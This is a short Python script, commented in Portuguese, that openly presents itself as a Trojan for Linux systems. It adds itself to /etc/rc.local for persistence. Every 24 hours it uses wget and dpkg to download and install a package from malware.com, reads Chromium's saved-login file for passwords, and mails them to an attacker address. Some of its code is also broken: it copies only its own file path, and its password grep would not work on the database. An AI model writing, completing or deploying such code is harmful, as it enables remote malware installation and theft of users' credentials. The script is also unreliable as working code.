import os
import time

# Verifica se o Trojan já está instalado no sistema
if os.path.exists("/usr/local/trojan"):
    exit()

# Caso contrário, cria uma pasta para o Trojan no sistema
os.mkdir("/usr/local/trojan")

# Copia o arquivo do Trojan para a pasta criada
with open("/usr/local/trojan/trojan.py", "w") as f:
    f.write(__file__)

# Cria um atalho para o Trojan na inicialização do sistema
with open("/etc/rc.local", "a") as f:
    f.write("python3 /usr/local/trojan/trojan.py &\n")

# Fica em loop para realizar as tarefas maliciosas periodicamente
while True:
    # Tarefa maliciosa 1: instalar outro malware
    os.system("wget http://malware.com/malware.deb && dpkg -i malware.deb")

    # Tarefa maliciosa 2: roubar senhas do navegador
    senhas = os.popen("cat ~/.config/chromium/Default/Login\ Data | grep 'password'").read()
    with open("/usr/local/trojan/senhas.txt", "w") as f:
        f.write(senhas)

    # Tarefa maliciosa 3: enviar as senhas roubadas para o invasor
    with open("/usr/local/trojan/senhas.txt", "r") as f:
        senhas = f.read()
    os.system(f"echo '{senhas}' | mail -s 'Senhas roubadas' invasor@email.com")

    # Aguarda 24 horas antes de realizar as tarefas novamente
    time.sleep(86400)
